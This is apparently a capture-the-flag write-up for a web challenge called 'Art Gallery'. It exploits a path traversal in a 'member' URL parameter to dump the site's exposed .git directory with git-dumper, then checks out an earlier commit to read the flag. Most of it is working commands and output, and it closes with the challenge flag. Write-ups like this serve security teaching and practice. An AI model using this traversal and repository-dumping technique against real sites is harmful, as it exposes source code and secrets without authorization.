# Art Gallery

![](Pasted%20image%2020220502203549.png)

## Solution

On navigating the website, the link https://art-gallery.web.actf.co/gallery?member= suggested LFI at the member parameter. 

The description suggested a git repository. Since the source code

```bash┌──(kali㉿kali)-[/tmp]
└─$ git-dumper https://art-gallery.web.actf.co/gallery?member=../.git/ /tmp/repo
[-] Testing https://art-gallery.web.actf.co/gallery?member=../.git/HEAD [200]
[-] Testing https://art-gallery.web.actf.co/gallery?member=../.git/ [200]
[-] Fetching common files
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/COMMIT_EDITMSG [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.gitignore [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.gitignore responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/post-commit.sample [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/hooks/post-commit.sample responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/applypatch-msg.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/post-update.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/pre-commit.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/commit-msg.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/pre-push.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/post-receive.sample [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/hooks/post-receive.sample responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/update.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/index [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/info/packs [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/objects/info/packs responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/pre-rebase.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/pre-receive.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/hooks/pre-applypatch.sample [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/info/exclude [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/description [200]
[-] Finding refs/
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/FETCH_HEAD [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/FETCH_HEAD responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/ORIG_HEAD [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/ORIG_HEAD responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/logs/HEAD [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/logs/refs/heads/master [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/logs/refs/remotes/origin/HEAD [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/logs/refs/remotes/origin/HEAD responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/logs/refs/remotes/origin/master [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/logs/refs/remotes/origin/master responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/logs/refs/stash [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/logs/refs/stash responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/packed-refs [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/packed-refs responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/refs/heads/master [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/refs/remotes/origin/HEAD [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/refs/remotes/origin/HEAD responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/refs/remotes/origin/master [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/refs/remotes/origin/master responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/refs/stash [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/refs/stash responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/refs/wip/wtree/refs/heads/master [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/refs/wip/wtree/refs/heads/master responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/refs/wip/index/refs/heads/master [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/refs/wip/index/refs/heads/master responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/config [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/info/refs [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/info/refs responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/HEAD [200]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/8a/ba39c0cc9e4e4835796ff01b98c86b8bc81b01 [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/ab/8ad5c7ab55aa2d66b9c4a9041f13e298a3c18f [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/56/449caeb7973b88f20d67b4c343cbb895aa6bc7 [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/1c/584170fb33ae17a63e22456f19601efb1f23db [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/a5/b3c03785736215a4baa6740b5e595eac72ecc1 [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/3f/bb557e5558aec56295c7f57e2d53f451d776cc [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/36/781365cafae93b3cd8dbc5450e62c0eb57aeea [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/1b/9d0af53001a5c2a72c0c61d16d62403992800b [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/71/3a4aba8af38c9507ced6ea41f602b105ca4101 [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/00/00000000000000000000000000000000000000 [200]
[-] https://art-gallery.web.actf.co/gallery?member=../.git/objects/00/00000000000000000000000000000000000000 responded with HTML
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/ff/511529549e4a9376c897df27e001a909caa933 [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/56/e8e4282f1e92b8f9e7183771f73777fb3b78ef [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/4c/6c1591f1c1eac077042a3d5f37fa90c5bb4e0d [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/5c/1ff269bddd32dbe31722b499189947fbd8346a [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/78/0f864715099a7612efae3a3cdbccde05a0adc4 [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/14/86c662205e9b59ec3a3203f22421d9a538f241 [200]
[-] Fetching https://art-gallery.web.actf.co/gallery?member=../.git/objects/eb/8070196c48bf973d69f04aa6befea57a79641c [200]
[-] Running git checkout .
                                                                                                                                                     
┌──(kali㉿kali)-[/tmp]
└─$ cd repo
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp/repo]
└─$ git-repair                                                                  
Running git fsck ...
No problems found.
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp/repo]
└─$ git-repair --force
Running git fsck ...
No problems found.
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp/repo]
└─$ git status                                              
On branch master
nothing to commit, working tree clean
                                                                                                                                                                       
┌──(kali㉿kali)-[/tmp/repo]
└─$ ls        
error.html  images  index.html  index.js  package.json  package-lock.json

┌──(kali㉿kali)-[/tmp/repo]
└─$ git log   
commit 1c584170fb33ae17a63e22456f19601efb1f23db (HEAD -> master)
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:47:45 2022 -0400

    bury secrets

commit 713a4aba8af38c9507ced6ea41f602b105ca4101
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:44:48 2022 -0400

    remove vital secrets

commit 56449caeb7973b88f20d67b4c343cbb895aa6bc7
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:44:01 2022 -0400

    add program
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/repo]
└─$ git checkout 56449caeb7973b88f20d67b4c343cbb895aa6bc7   
Note: switching to '56449caeb7973b88f20d67b4c343cbb895aa6bc7'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 56449ca add program
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/repo]
└─$ ls
error.html  flag.txt  images  index.html  index.js  package.json  package-lock.json
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/repo]
└─$ cat flag.txt 
actf{lfi_me_alone_and_git_out_341n4kaf5u59v}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/repo]
└─$ 
```

## Flag

`actf{lfi_me_alone_and_git_out_341n4kaf5u59v}`